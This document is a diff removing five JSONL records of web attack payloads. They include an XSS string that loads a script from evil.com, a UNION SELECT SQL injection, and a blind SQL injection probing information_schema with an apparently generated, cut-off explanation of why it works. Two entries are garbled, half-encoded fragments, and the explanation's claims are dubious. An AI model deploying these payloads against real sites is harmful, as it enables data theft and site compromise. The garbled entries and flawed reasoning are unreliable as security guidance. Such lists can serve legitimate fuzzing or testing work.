@@ -1,5 +1,0 @@
-{"payload": "```\n%27+%22%3E%3Cscript+src%3D%22http%3A%2F%2Fevil.com%2Fhack.js%22%20%2F%3E%3C%2Fscript%3E%22\n```"}
-{"payload": "\" UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL"}
-{"payload": "`%27+or+%28%2a%2f+%2b+%2a%2a%2b+%2a%2b%2a+%2b%2b%2b%2b%2b%2b%2b%2b%2b%2b%2b%2b%2b%2b%2b%2b%2b%2b%2b"}
-{"payload": "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'database_name') = 0\n\nReason: This payload is effective because it exploits a common SQL injection vulnerability by attempting to manipulate the SQL query. The payload consists of two parts:\n\n1. 1' - This part is used to bypass SQL injection filters and successfully inject SQL code into the database.\n\n2. AND (SELECT COUNT(*) FROM information_"}
-{"payload": "`or%201%20%3D%20NULL%20%28SELECT%20NULL%20from%20information_schema.tables%20where%20table_schema%3D%27%27%20and%20table_name%3D%27mysql%27%20limit%200%2C%201%29%2"}
